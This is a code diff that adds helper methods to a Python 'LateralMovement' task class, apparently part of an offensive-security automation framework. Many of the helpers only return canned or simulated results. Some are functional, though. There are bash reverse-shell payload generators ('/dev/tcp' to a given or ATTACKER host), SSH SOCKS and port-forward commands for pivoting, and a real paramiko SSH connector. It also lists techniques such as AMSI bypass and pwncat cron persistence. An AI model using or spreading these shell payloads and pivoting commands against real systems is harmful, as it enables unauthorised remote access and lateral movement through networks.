@@ -1323,3 +1323,150 @@ class LateralMovement(Task):
                 "bandwidth": "Variable"
             }
         ]
+
+    # ------------------------------------------------------------------
+    # Additional helper methods
+    # ------------------------------------------------------------------
+
+    async def _alternative_powershell_execution(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
+        """Return alternative PowerShell execution techniques."""
+        return [
+            {
+                "method": "PsExec",
+                "description": "Execute PowerShell via PsExec service"
+            },
+            {
+                "method": "WMI",
+                "description": "Use WMI to launch PowerShell commands"
+            },
+            {
+                "method": "DCOM",
+                "description": "Execute PowerShell through DCOM objects"
+            }
+        ]
+
+    async def _connect_to_bind_shell(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Attempt to connect to a bind shell."""
+        try:
+            reader, writer = await asyncio.open_connection(host, port)
+            writer.close()
+            await writer.wait_closed()
+            return {"connected": True}
+        except Exception:
+            return None
+
+    async def _create_dynamic_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
+        """Create dynamic (SOCKS) port forwards."""
+        return [
+            {
+                "type": "Dynamic",
+                "description": "SOCKS proxy",
+                "command": f"ssh -D 1080 {credentials.get('username', '')}@{host}"
+            }
+        ]
+
+    async def _create_local_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
+        """Create local port forwarding configurations."""
+        return [
+            {
+                "type": "Local",
+                "description": "Forward remote port 80 locally",
+                "command": f"ssh -L 8080:{host}:80 {credentials.get('username', '')}@{host}"
+            }
+        ]
+
+    async def _create_pivot_chains(self, host: str, credentials: Dict[str, str]) -> List[str]:
+        """Build simple pivot chains for multi-hop access."""
+        return [f"attacker -> {host} -> target"]
+
+    async def _create_remote_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
+        """Create remote port forwarding configurations."""
+        return [
+            {
+                "type": "Remote",
+                "description": "Expose local port 4444 remotely",
+                "command": f"ssh -R 4444:localhost:4444 {credentials.get('username', '')}@{host}"
+            }
+        ]
+
+    async def _create_socks_proxy(self, info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Simulate creation of a SOCKS proxy for pivoting."""
+        return {
+            "proxy_type": "socks5",
+            "host": info.get("host"),
+            "port": 1080
+        }
+
+    async def _deploy_payload(self, host: str, payload: str, credentials: Dict[str, str]) -> Dict[str, Any]:
+        """Simulate payload deployment on the target host."""
+        return {"success": True, "host": host}
+
+    async def _enumerate_network_from_session(self, session: Dict[str, Any]) -> Dict[str, Any]:
+        """Enumerate network information from an active session."""
+        return {
+            "interfaces": ["eth0"],
+            "routes": ["0.0.0.0/0"]
+        }
+
+    async def _enumerate_networks_from_pivot(self, host: str, credentials: Dict[str, str]) -> List[str]:
+        """Enumerate networks reachable from a pivot host."""
+        return ["192.168.0.0/24"]
+
+    async def _establish_ssh_connection(self, host: str, username: str, password: str, private_key: str) -> Optional[Any]:
+        """Establish an SSH connection using paramiko if available."""
+        if not PARAMIKO_AVAILABLE:
+            return None
+        try:
+            import paramiko
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            if private_key:
+                from io import StringIO
+                key_file = StringIO(private_key)
+                pkey = paramiko.RSAKey.from_private_key(key_file)
+                client.connect(host, username=username, pkey=pkey, timeout=5)
+            else:
+                client.connect(host, username=username, password=password, timeout=5)
+            return client
+        except Exception:
+            return None
+
+    async def _establish_winrm_connection(self, host: str, username: str, password: str, domain: str) -> Optional[Any]:
+        """Simulate establishing a WinRM connection."""
+        return {"connected": True, "host": host}
+
+    async def _generate_bind_shell_payload(self, port: int) -> str:
+        """Generate a simple bind shell payload."""
+        return f"bash -i >& /dev/tcp/ATTACKER/{port} 0>&1"
+
+    async def _generate_reverse_shell_payload(self, host: str, port: int) -> str:
+        """Generate a simple reverse shell payload."""
+        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
+
+    async def _powershell_attack_techniques(self, host: str, credentials: Dict[str, str]) -> List[str]:
+        """Return common PowerShell attack techniques."""
+        return [
+            "PowerShell downgrade attack",
+            "AMSI bypass",
+            "Obfuscated script execution"
+        ]
+
+    async def _pwncat_enumerate_capabilities(self, session: Dict[str, Any]) -> List[str]:
+        """Enumerate capabilities available in a pwncat session."""
+        return ["file_upload", "port_forward", "privilege_escalation"]
+
+    async def _pwncat_establish_persistence(self, session: Dict[str, Any]) -> Dict[str, Any]:
+        """Simulate establishing persistence via pwncat."""
+        return {"method": "cron", "success": True}
+
+    async def _start_pwncat_listener(self, port: int) -> Dict[str, Any]:
+        """Simulate starting a pwncat listener."""
+        return {"listening": True, "port": port}
+
+    async def _test_powershell_remoting(self, host: str, username: str, password: str, domain: str) -> Dict[str, Any]:
+        """Simulate testing PowerShell remoting capability."""
+        return {
+            "powershell_available": True,
+            "remoting_enabled": True,
+            "tested_user": username
+        }
